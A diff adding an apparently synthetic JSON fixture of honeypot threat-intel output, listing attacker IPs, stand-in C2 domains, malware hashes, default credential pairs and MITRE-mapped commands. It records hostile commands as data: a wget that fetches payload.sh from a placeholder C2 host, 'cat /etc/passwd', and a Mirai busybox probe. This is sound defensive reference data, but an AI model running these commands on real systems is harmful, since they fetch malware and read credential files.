@@ -1,0 +1,187 @@
+{
+  "metadata": {
+    "extraction_time": "2024-01-22T14:30:00.000Z",
+    "time_range_start": "2024-01-15T00:00:00.000Z",
+    "time_range_end": "2024-01-22T00:00:00.000Z",
+    "days_analyzed": 7,
+    "min_confidence": 0.1
+  },
+  "ips": {
+    "192.0.2.1": {
+      "count": 127,
+      "first_seen": "2024-01-15T08:23:15.000Z",
+      "last_seen": "2024-01-22T11:45:30.000Z",
+      "protocols": ["ssh", "http"],
+      "honeypots": ["cowrie", "dionaea"],
+      "threat_score": 75,
+      "geoip": {
+        "country": "China",
+        "city": "Beijing",
+        "latitude": 39.9042,
+        "longitude": 116.4074,
+        "asn": "AS4134 Chinanet"
+      },
+      "confidence": 0.85
+    },
+    "198.51.100.42": {
+      "count": 89,
+      "first_seen": "2024-01-16T03:12:45.000Z",
+      "last_seen": "2024-01-22T09:30:20.000Z",
+      "protocols": ["ssh"],
+      "honeypots": ["cowrie"],
+      "threat_score": 65,
+      "geoip": {
+        "country": "United States",
+        "city": "New York",
+        "latitude": 40.7128,
+        "longitude": -74.0060,
+        "asn": "AS15169 Google LLC"
+      },
+      "confidence": 0.72
+    },
+    "203.0.113.7": {
+      "count": 54,
+      "first_seen": "2024-01-17T14:55:00.000Z",
+      "last_seen": "2024-01-21T16:20:15.000Z",
+      "protocols": ["http", "ftp"],
+      "honeypots": ["dionaea"],
+      "threat_score": 50,
+      "geoip": {
+        "country": "Russia",
+        "city": "Moscow",
+        "latitude": 55.7558,
+        "longitude": 37.6173,
+        "asn": "AS12389 Rostelecom"
+      },
+      "confidence": 0.68
+    }
+  },
+  "domains": {
+    "malicious-c2.example.com": {
+      "count": 23,
+      "first_seen": "2024-01-16T10:30:00.000Z",
+      "urls": [
+        "http://malicious-c2.example.com/payload.sh",
+        "http://malicious-c2.example.com/bot.bin"
+      ],
+      "confidence": 0.9
+    },
+    "exploit-kit.example.net": {
+      "count": 15,
+      "first_seen": "2024-01-18T22:15:00.000Z",
+      "urls": [
+        "http://exploit-kit.example.net/landing.php"
+      ],
+      "confidence": 0.85
+    }
+  },
+  "urls": {
+    "http://malicious-c2.example.com/payload.sh": {
+      "count": 12,
+      "first_seen": "2024-01-16T10:30:00.000Z",
+      "method": "GET",
+      "confidence": 0.9
+    },
+    "http://exploit-kit.example.net/landing.php?id=123": {
+      "count": 15,
+      "first_seen": "2024-01-18T22:15:00.000Z",
+      "method": "GET",
+      "confidence": 0.85
+    }
+  },
+  "file_hashes": {
+    "5d41402abc4b2a76b9719d911017c592": {
+      "type": "md5",
+      "count": 8,
+      "first_seen": "2024-01-17T09:45:00.000Z",
+      "filename": "mirai.bot",
+      "source_url": "http://malicious-c2.example.com/bot.bin",
+      "confidence": 0.95
+    },
+    "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae": {
+      "type": "sha256",
+      "count": 5,
+      "first_seen": "2024-01-19T15:20:00.000Z",
+      "filename": "xmrig_miner",
+      "source_url": "http://mining-pool.example.org/xmrig",
+      "confidence": 0.92
+    }
+  },
+  "credentials": {
+    "root:root": {
+      "username": "root",
+      "password": "root",
+      "count": 234,
+      "success": false,
+      "first_seen": "2024-01-15T08:00:00.000Z",
+      "confidence": 0.95
+    },
+    "admin:admin": {
+      "username": "admin",
+      "password": "admin",
+      "count": 187,
+      "success": false,
+      "first_seen": "2024-01-15T09:15:00.000Z",
+      "confidence": 0.93
+    },
+    "admin:123456": {
+      "username": "admin",
+      "password": "123456",
+      "count": 156,
+      "success": false,
+      "first_seen": "2024-01-15T10:30:00.000Z",
+      "confidence": 0.91
+    }
+  },
+  "commands": {
+    "wget http://malicious-c2.example.com/payload.sh": {
+      "count": 12,
+      "first_seen": "2024-01-16T10:30:00.000Z",
+      "mitre_technique": "T1105"
+    },
+    "cat /etc/passwd": {
+      "count": 45,
+      "first_seen": "2024-01-15T11:20:00.000Z",
+      "mitre_technique": "T1083"
+    },
+    "/bin/busybox MIRAI": {
+      "count": 23,
+      "first_seen": "2024-01-17T14:00:00.000Z",
+      "mitre_technique": "T1059.004"
+    }
+  },
+  "malware_families": {
+    "mirai": {
+      "count": 23,
+      "first_seen": "2024-01-17T14:00:00.000Z"
+    },
+    "xmrig": {
+      "count": 5,
+      "first_seen": "2024-01-19T15:20:00.000Z"
+    }
+  },
+  "statistics": {
+    "total_unique_ips": 3,
+    "total_unique_domains": 2,
+    "total_unique_urls": 2,
+    "total_file_hashes": 2,
+    "total_credentials": 3,
+    "total_commands": 3,
+    "total_malware_families": 2,
+    "top_attacker_ips": [
+      ["192.0.2.1", 127],
+      ["198.51.100.42", 89],
+      ["203.0.113.7", 54]
+    ],
+    "top_credentials": [
+      ["root:root", 234],
+      ["admin:admin", 187],
+      ["admin:123456", 156]
+    ],
+    "top_commands": [
+      ["cat /etc/passwd", 45],
+      ["/bin/busybox MIRAI", 23],
+      ["wget http://malicious-c2.example.com/payload.sh", 12]
+    ]
+  }
+}
